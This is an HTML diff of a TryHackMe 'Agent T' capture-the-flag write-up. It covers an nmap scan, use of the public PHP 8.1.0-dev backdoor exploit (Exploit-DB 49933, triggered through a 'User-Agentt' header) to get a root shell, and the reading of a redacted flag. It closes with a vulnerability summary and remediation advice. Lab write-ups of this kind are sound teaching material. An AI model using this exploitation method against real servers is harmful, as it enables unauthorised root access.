@@ -1,0 +1,147 @@
+<title>TryHackMe - Agent T (Easy)</title>
+<header>
+  <div class="header">
+    <div class="titleContainer">
+      <img class="headerIcon" src="/write-ups/TryHackMe/Easy/Agent T/icon.png"/>
+      <p class="mainTitle">TryHackMe - Agent T (Easy)</p>
+    </div>
+  </div>
+</header>
+<div class="writeUp">
+    <h1 id="table-of-contents">Table of contents</h1>
+    <nav id="tableOfContents" class="tableOfContents">
+    </nav>
+    <h1 id="reconnaissance">Reconnaissance</h1>
+    <h2 id="nmap-scan">Nmap scan</h2>
+    <p>Let's start with an agressive [nmap](https://nmap.org/) scan against the target :</p>
+    <div class="codeBlock"># Nmap 7.80 scan initiated Mon Oct 24 12:38:20 2022 as: nmap -A -p- -oN nmapResults.txt 10.10.222.61
+Nmap scan report for 10.10.222.61
+Host is up (0.066s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
+|_http-title:  Admin Dashboard
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Oct 24 12:39:08 2022 -- 1 IP address (1 host up) scanned in 48.33 seconds</div>
+      <p>There is only one open port, where we can access a website (port 80). Also, we have the PHP version (8.1.0-dev).</p>
+      <h2 id="web-reconnaissance">Web reconnaissance</h2>      
+      <p>Let's take a look at the website using a web browser :</p>
+      <img src="/write-ups/TryHackMe/Easy/Agent T/image1.jpg"/>
+      <p>This is an admin dashboard. Almost all of the buttons in this dashboard are not working and everything seems to be just cosmetics.</p>
+      <h1 id="initial-access">Initial access</h1>
+      <p>
+        The only information we have that seems to be useful to exploit this webserver is the PHP version which is outdated. We can search for 
+        available exploits for this PHP version on <a href="https://www.exploit-db.com/">Exploit-DB</a>. If we search for "PHP 8.1.0-dev", 
+        there is only one result :
+      </p>
+      <img src="/write-ups/TryHackMe/Easy/Agent T/image2.jpg"/>
+      <p>This exploit leads to a RCE (Remote Code Execution), we may be able to get a reverse shell using this exploit. Let's take a look at it :</p>
+      <img src="/write-ups/TryHackMe/Easy/Agent T/image3.jpg"/>
+      <p>
+        This exploit uses a backdoor present in this PHP version. The backdoor can be used by adding an HTTP header named `User-Agentt` containing 
+        a payload. Let's download this exploit and use it against the target :
+      </p>
+      <div class="codeBlock">attacker@AttackBox:~/Documents/THM/CTF/Agent_T$ python3 49933.py 
+Enter the full host url:
+http://10.10.222.61/ 
+
+Interactive shell is opened on http://10.10.222.61/ 
+Can't acces tty; job crontol turned off.
+$ whoami
+root
+
+$</div>
+      <p>And we already have a shell as root ! Let's get the flag :</p>
+      <div class="codeBlock">$ ls /
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+$ cat /flag.txt
+flag{<mark class="red_text">&lt;REDACTED&gt;</mark>}</div>
+        <h1 id="tools-used">Tools used</h1>
+        <table>
+          <thead>
+            <tr>
+              <th>Tool</th>
+              <th>Purpose</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><a href="https://nmap.org/">Nmap</a></td>
+              <td>
+                - Scan for open ports<br>
+                - Scan services version
+              </td>
+            </tr>
+            <tr>
+              <td><a href="https://www.exploit-db.com/exploits/49933">49933.py</a></td>
+              <td>Exploit remote code execution in PHP 8.1.0-dev</td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="vulnerabilities-summary">Vulnerabilities summary</h1>
+        <h2 id="remote-code-execution">Remote Code Execution</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Field</th>
+              <th>Value</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Affected component</td>
+              <td>Web server</td>
+            </tr>
+            <tr>
+              <td>CVSS 3.0 score</td>
+              <td>9.8</td>
+            </tr>
+            <tr>
+              <td>Severity</td>
+              <td><mark class="highlight_red">CRITICAL</mark></td>
+            </tr>
+            <tr>
+              <td>Attack vector</td>
+              <td>Network</td>
+            </tr>
+            <tr>
+              <td>Impact</td>
+              <td>
+                Allows an attacker to execute arbitrary commands remotely as root at any time.<br>
+                <br>
+                This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b>, 
+                <b>availability</b> and <b>integrity</b> of the entire system.
+              </td>
+            </tr>
+            <tr>
+              <td>Remediation proposition</td>
+              <td>Update PHP to the latest version.</td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="sources">Sources</h1>
+        <ul>
+          <li>PHP 8.1.0-dev backdoor : <a href="https://systemweakness.com/php-8-1-0-dev-backdoor-b262206d9b7f">https://systemweakness.com/php-8-1-0-dev-backdoor-b262206d9b7f</a></li>
+        </ul>
+</div>
